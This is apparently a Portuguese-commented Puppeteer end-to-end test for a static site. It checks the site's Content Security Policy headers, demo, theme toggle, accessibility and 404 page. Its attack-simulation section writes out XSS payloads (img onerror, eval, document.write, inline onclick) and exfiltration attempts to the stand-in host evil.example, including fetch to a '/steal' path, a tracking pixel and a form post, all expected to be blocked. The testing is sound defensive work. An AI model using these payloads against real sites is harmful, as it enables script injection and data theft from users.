// Teste de navegador (npm run e2e): serve dist/ com os MESMOS cabeçalhos da política e confere, num Chrome/Edge de verdade, que
// (1) o site funciona sem violar a própria CSP, (2) o demo e o tema funcionam, (3) a política bloqueia ataques simulados,
// em duas camadas, e (4) a acessibilidade passa no axe-core em 4 configurações. Rode depois de `npm run build`.
// Precisa de um navegador Chromium: use CHROME_PATH para indicar o caminho, se não for um dos comuns.
import { createServer } from "node:http";
import { readFileSync, existsSync, statSync } from "node:fs";
import path from "node:path";
import puppeteer from "puppeteer-core";
import axeCore from "axe-core";

const SITE = path.resolve(import.meta.dirname, "..");
const DIST = path.join(SITE, "dist");
const { SECURITY_HEADERS, CACHE_RULES } = await import(new URL("../security/policy.mjs", import.meta.url).href);

const TYPES = { ".html": "text/html; charset=utf-8", ".css": "text/css; charset=utf-8", ".js": "text/javascript; charset=utf-8", ".woff2": "font/woff2", ".png": "image/png", ".svg": "image/svg+xml", ".txt": "text/plain; charset=utf-8" };

// Servidor estático que aplica os MESMOS cabeçalhos de public/_headers (vindos da política).
// Script do "atacante": roda como código da PRÓPRIA página (mesmo domínio), tentando o que uma CSP fraca deixaria passar.
const ATTACK = `
const results = {};
const t = (name, fn) => { try { results[name] = "executou: " + String(fn()); } catch (e) { results[name] = "bloqueado: " + e.name; } };
t("eval", () => eval("window.__pwned = 'eval'; 1 + 1"));
t("new Function", () => new Function("window.__pwned = 'function'")());
t("setTimeout com texto", () => { setTimeout("window.__pwned = 'timeout'", 0); return "agendado"; });
t("document.write", () => { document.write("<img src=x onerror=\\"window.__pwned='write'\\">"); return "escrito"; });
t("manipulador onclick inline", () => { const b = document.createElement("button"); b.setAttribute("onclick", "window.__pwned = 'onclick'"); document.body.appendChild(b); b.click(); return "clicou"; });
window.__attackResults = results;
`;
const server = createServer((req, res) => {
  const reqUrl = new URL(req.url ?? "/", "http://x");
  if (reqUrl.pathname === "/__attack.js") {
    const headers = { "Content-Type": "text/javascript; charset=utf-8" };
    for (const [k, v] of SECURITY_HEADERS) headers[k] = v;
    res.writeHead(200, headers);
    return res.end(ATTACK);
  }
  let p = decodeURIComponent(reqUrl.pathname);
  if (p === "/") p = "/index.html";
  let file = path.join(DIST, p);
  if (!existsSync(file) || statSync(file).isDirectory()) file = existsSync(file + ".html") ? file + ".html" : path.join(DIST, "404.html");
  const status = file.endsWith("404.html") && !p.endsWith("404.html") ? 404 : 200;
  const headers = { "Content-Type": TYPES[path.extname(file)] ?? "application/octet-stream" };
  const noTT = (csp) => csp.replace(/;?s*require-trusted-types-for 'script'/, "").replace(/;?s*trusted-types 'none'/, "");
  for (const [k, v] of SECURITY_HEADERS) headers[k] = reqUrl.searchParams.get("nott") && k === "Content-Security-Policy" ? noTT(v) : v;
  for (const rule of CACHE_RULES) if (p.startsWith(rule.pattern.replace("*", ""))) headers["Cache-Control"] = rule.value;
  res.writeHead(status, headers);
  let body = readFileSync(file);
  if (reqUrl.searchParams.get("attack") && file.endsWith("index.html")) {
    let html = body.toString().replace("</body>", '<script src="/__attack.js"></script></body>');
    if (reqUrl.searchParams.get("nott")) html = html.replace(/(<meta http-equiv="Content-Security-Policy" content=")([^"]*)"/, (_m, a, csp) => a + noTT(csp) + '"');
    body = Buffer.from(html);
  }
  res.end(body);
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const URL_BASE = `http://127.0.0.1:${server.address().port}`;

const results = [];
const check = (ok, name, detail = "") => { results.push(ok); console.log(`  ${ok ? "✔" : "✖"} ${name}${detail ? "  [" + detail + "]" : ""}`); };

const CANDIDATES = [process.env["CHROME_PATH"], "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe", "C:/Program Files/Google/Chrome/Application/chrome.exe", "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium", "/usr/bin/chromium-browser", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"].filter(Boolean);
const executablePath = CANDIDATES.find((p) => existsSync(p));
if (!executablePath) throw new Error("nenhum Chrome/Edge encontrado: defina CHROME_PATH");
const browser = await puppeteer.launch({ executablePath, headless: true, args: process.env["CI"] ? ["--no-sandbox"] : [] });
try {
  // ------------------------------------------------------------------ 1) o site funciona sem violar a CSP
  console.log("\n1) O site funcionando, sem violar a própria política");
  const page = await browser.newPage();
  const consoleErrors = [], failed = [], requests = [];
  page.on("console", (m) => { if (["error", "warning"].includes(m.type())) consoleErrors.push(`${m.type()}: ${m.text().slice(0, 160)}`); });
  page.on("pageerror", (e) => consoleErrors.push("pageerror: " + e.message));
  page.on("requestfailed", (r) => failed.push(r.url()));
  page.on("request", (r) => requests.push(r.url()));
  await page.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  await page.setViewport({ width: 1280, height: 900 });
  const response = await page.goto(URL_BASE + "/", { waitUntil: "networkidle0" });
  const h = response.headers();
  check((h["content-security-policy"] ?? "").includes("default-src 'none'") && (h["content-security-policy"] ?? "").includes("frame-ancestors 'none'"), "CSP em cabeçalho HTTP, com frame-ancestors 'none'");
  for (const name of ["strict-transport-security", "x-content-type-options", "x-frame-options", "referrer-policy", "permissions-policy", "cross-origin-opener-policy", "cross-origin-resource-policy"]) check(Boolean(h[name]), `cabeçalho ${name}`, h[name]?.slice(0, 40));
  check((await page.evaluate(() => window.__violations)).length === 0, "zero violações de CSP ao carregar a página", JSON.stringify(await page.evaluate(() => window.__violations)));
  check(consoleErrors.length === 0, "zero erros ou avisos no console", consoleErrors.join(" | "));
  check(failed.length === 0, "nenhuma requisição falhou", failed.join(", "));
  const origins = new Set(requests.map((u) => new URL(u).origin));
  check(origins.size === 1 && origins.has(URL_BASE), "TODAS as requisições vão para o próprio site (nada de terceiros)", [...origins].join(", "));
  const fonts = await page.evaluate(async () => { await document.fonts.ready; return [document.fonts.check("16px Nunito"), document.fonts.check("16px 'JetBrains Mono'")]; });
  check(fonts[0] && fonts[1], "fontes próprias carregadas (Nunito e JetBrains Mono)");
  check(await page.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth), "sem rolagem horizontal no desktop");

  // ------------------------------------------------------------------ 2) o demo funciona (mouse e teclado)
  console.log("\n2) O demo interativo (mouse, teclado e meta do dia)");
  const verdict = async () => page.evaluate(() => document.querySelector('[data-role="verdict"]').textContent);
  await page.click(".opt:nth-child(1)"); // A) undefined: errada
  check((await verdict()).includes("Errou"), "clique numa alternativa errada mostra o resultado", await verdict());
  check(await page.evaluate(() => document.querySelector('[data-role="card"]').className.includes("bad")), "cartão ganha a borda de erro");
  await page.click('[data-role="next"]');
  await page.keyboard.press("d"); // D) correta em ds-001
  check((await verdict()).includes("Acertou"), "tecla D responde pelo teclado", await verdict());
  let goal = "";
  for (let i = 0; i < 3; i++) { await page.click('[data-role="next"]'); await page.keyboard.press("a"); }
  goal = await page.evaluate(() => document.querySelector('[data-role="party"]').textContent + " | " + document.querySelector('[data-role="footer"]').innerText.replace(/\n/g, " "));
  check(/Meta do dia cumprida/.test(goal), "na 5ª resposta, aparece 'Meta do dia cumprida!' (+15 XP)", goal.slice(0, 90));

  // ------------------------------------------------------------------ 3) tema
  console.log("\n3) Botão de tema");
  const themeOf = () => page.evaluate(() => document.documentElement.dataset.theme ?? "auto");
  await page.click("#theme-toggle");
  check((await themeOf()) === "light", "1º clique: tema claro");
  await page.click("#theme-toggle");
  check((await themeOf()) === "dark", "2º clique: tema escuro");
  await page.reload({ waitUntil: "networkidle0" });
  check((await themeOf()) === "dark", "a escolha persiste ao recarregar (aplicada antes da pintura)");
  await page.click("#theme-toggle");
  check((await themeOf()) === "auto", "3º clique: volta ao automático");

  // ------------------------------------------------------------------ 4) ataques simulados
  console.log("\n4) Ataques simulados: a política precisa bloquear TODOS");
  await page.evaluate(() => { window.__violations = []; });
  const attack = async (name, fn, expect) => {
    await page.evaluate(() => { window.__pwned = undefined; window.__violations = []; });
    const outcome = await page.evaluate(async (code) => {
      try { await new Function("return (async()=>{" + code + "})()")(); return "executou"; } catch (e) { return "bloqueado: " + e.name; }
    }, fn);
    await new Promise((r) => setTimeout(r, 150));
    const pwned = await page.evaluate(() => window.__pwned);
    const violations = await page.evaluate(() => window.__violations);
    check(pwned === undefined && expect(outcome, violations), name, `${outcome}${violations.length ? " | violação: " + violations[0].slice(0, 60) : ""}`);
  };
  // new Function é ele mesmo um sink de eval: sob a política já não funciona. Os ataques usam as APIs diretamente quando preciso.
  const direct = async (name, fn, expectBlocked) => {
    await page.evaluate(() => { window.__pwned = undefined; window.__violations = []; });
    const outcome = await page.evaluate(fn);
    await new Promise((r) => setTimeout(r, 200));
    const pwned = await page.evaluate(() => window.__pwned);
    const violations = await page.evaluate(() => window.__violations);
    const blocked = pwned === undefined && expectBlocked(outcome, violations);
    check(blocked, name, `${outcome}${violations.length ? " | violação: " + violations[0].slice(0, 70) : ""}`);
  };
  await direct("innerHTML com <img onerror> é bloqueado (Trusted Types)", () => { try { document.body.innerHTML += '<img src=x onerror="window.__pwned=1">'; return "executou"; } catch (e) { return "bloqueado: " + e.name; } }, (o) => o.startsWith("bloqueado"));
  await direct("<script> injetado com texto é bloqueado", () => { try { const s = document.createElement("script"); s.textContent = "window.__pwned = 1"; document.head.appendChild(s); return "inserido"; } catch (e) { return "bloqueado: " + e.name; } }, (o, v) => o.startsWith("bloqueado") || v.length > 0);
  await direct("<script src> de outro domínio é bloqueado", () => { try { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; document.head.appendChild(s); return "inserido"; } catch (e) { return "bloqueado: " + e.name; } }, (o, v) => o.startsWith("bloqueado") || v.length > 0);
  await direct("estilo inline injetado não vale", () => { try { const s = document.createElement("style"); s.textContent = "body{display:none!important}"; document.head.appendChild(s); } catch { /* ok */ } return getComputedStyle(document.body).display; }, (o) => o !== "none");
  await direct("imagem de rastreamento (outro domínio) é bloqueada", () => new Promise((resolve) => { const i = new Image(); i.onload = () => resolve("carregou"); i.onerror = () => resolve("bloqueado"); i.src = "https://evil.example/pixel.gif"; }), (o, v) => o === "bloqueado" && v.some((x) => x.startsWith("img-src")));
  await direct("fetch para outro domínio é bloqueado", async () => { try { await fetch("https://evil.example/steal"); return "enviou"; } catch (e) { return "bloqueado: " + e.name; } }, (o, v) => o.startsWith("bloqueado") && v.some((x) => x.startsWith("connect-src")));
  await direct("formulário não envia dados para fora (form-action)", () => { const f = document.createElement("form"); f.action = "https://evil.example/"; f.method = "post"; document.body.appendChild(f); f.submit(); return "tentou enviar"; }, (_o, v) => v.some((x) => x.startsWith("form-action")));
  await direct("<iframe> não é permitido", () => { const f = document.createElement("iframe"); f.src = "https://evil.example/"; document.body.appendChild(f); return "inserido"; }, (_o, v) => v.some((x) => x.startsWith("frame-src") || x.startsWith("default-src")));

  console.log("   ...e agora como código da própria página (script do mesmo domínio tentando eval, new Function e afins)");
  const victim = await browser.newPage();
  await victim.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(e.violatedDirective + " " + (e.blockedURI || "")));
  });
  await victim.goto(URL_BASE + "/?attack=1", { waitUntil: "networkidle0" });
  await new Promise((r) => setTimeout(r, 400));
  const attackResults = await victim.evaluate(() => window.__attackResults);
  const attackViolations = await victim.evaluate(() => window.__violations);
  const attackPwned = await victim.evaluate(() => window.__pwned);
  for (const name of ["eval", "new Function", "setTimeout com texto", "document.write", "manipulador onclick inline"]) {
    const outcome = attackResults?.[name] ?? "(sem resultado)";
    const blockedBySync = outcome.startsWith("bloqueado");
    const blockedAsync = name === "setTimeout com texto" || name === "manipulador onclick inline"; // o bloqueio dessas aparece como violação, não como exceção
    check(blockedBySync || blockedAsync, name + " é bloqueado quando o código vem da própria página", outcome);
  }
  check(attackPwned === undefined, "NENHUM dos ataques conseguiu executar código (window.__pwned continua indefinido)", String(attackPwned));
  check(attackViolations.some((v) => v.startsWith("require-trusted-types-for")), "camada 1 (Trusted Types) registrou a violação", [...new Set(attackViolations)].join(" | ").slice(0, 100));
  await victim.close();

  // camada 2: a MESMA investida contra uma cópia da política sem Trusted Types. Agora quem bloqueia é o script-src.
  const layered = await browser.newPage();
  await layered.evaluateOnNewDocument(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(e.violatedDirective + " " + (e.blockedURI || "")));
  });
  await layered.goto(URL_BASE + "/?attack=1&nott=1", { waitUntil: "networkidle0" });
  await new Promise((r) => setTimeout(r, 500));
  const layeredResults = await layered.evaluate(() => window.__attackResults);
  const layeredViolations = await layered.evaluate(() => window.__violations);
  const layeredPwned = await layered.evaluate(() => window.__pwned);
  const layeredPolicy = await layered.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]').content);
  check(!layeredPolicy.includes("trusted-types"), "(controle) a cópia da política realmente NÃO tem Trusted Types");
  check(layeredPwned === undefined, "camada 2 (script-src sozinho): nenhum ataque executou código", String(layeredPwned));
  check(layeredResults?.["eval"]?.startsWith("bloqueado") && layeredResults?.["new Function"]?.startsWith("bloqueado"), "camada 2: eval e new Function bloqueados pelo script-src", `${layeredResults?.["eval"]} / ${layeredResults?.["new Function"]}`);
  check(layeredViolations.some((v) => v.startsWith("script-src")) && layeredViolations.some((v) => v.startsWith("script-src-attr")), "camada 2: violações de script-src (eval/timeout) e script-src-attr (onclick inline) registradas", [...new Set(layeredViolations)].join(" | ").slice(0, 120));
  await layered.close();

  // ------------------------------------------------------------------ 5) acessibilidade (axe-core) em 4 configurações
  console.log("\n5) Acessibilidade (axe-core), 4 configurações");
  for (const [name, w, hh, scheme] of [["desktop claro", 1280, 900, "light"], ["desktop escuro", 1280, 900, "dark"], ["celular claro", 400, 800, "light"], ["celular escuro", 400, 800, "dark"]]) {
    const p = await browser.newPage();
    await p.emulateMediaFeatures([{ name: "prefers-color-scheme", value: scheme }]);
    await p.setViewport({ width: w, height: hh });
    await p.goto(URL_BASE + "/", { waitUntil: "networkidle0" });
    // o CSP bloqueia injetar o axe pela página; usa o Chrome DevTools para rodar o código de fora da política
    const client = await p.createCDPSession();
    await client.send("Page.setBypassCSP", { enabled: true });
    await p.reload({ waitUntil: "networkidle0" });
    await p.evaluate(axeCore.source);
    const violations = await p.evaluate(async () => (await window.axe.run(document)).violations.map((v) => `${v.id}(${v.nodes.length}): ${v.nodes[0].target.join(" ")}`));
    const overflow = await p.evaluate(() => document.documentElement.scrollWidth > document.documentElement.clientWidth);
    check(violations.length === 0 && !overflow, `${name}: zero violações de acessibilidade e sem rolagem horizontal`, violations.join(" | "));
    await p.close();
  }

  // ------------------------------------------------------------------ 6) 404 e links
  console.log("\n6) Página 404 e links");
  const notFound = await browser.newPage();
  const nf = await notFound.goto(URL_BASE + "/nao-existe", { waitUntil: "networkidle0" });
  check(nf.status() === 404 && (await notFound.title()).includes("não encontrada"), "página inexistente devolve 404 com a página própria", `status ${nf.status()}`);
  const links = await page.evaluate(() => [...document.querySelectorAll("a[target=_blank]")].map((a) => `${new URL(a.href).hostname} rel=${a.rel}`));
  check(links.length > 0 && links.every((l) => /rel=.*noopener/.test(l) && /rel=.*noreferrer/.test(l)), "todo link externo abre com rel noopener noreferrer", [...new Set(links)].join("; "));
} finally {
  await browser.close();
  server.close();
}
const failed = results.filter((r) => !r).length;
console.log(`\n${results.length - failed}/${results.length} verificações passaram${failed ? " (HÁ FALHAS)" : ""}`);
process.exit(failed ? 1 : 0);
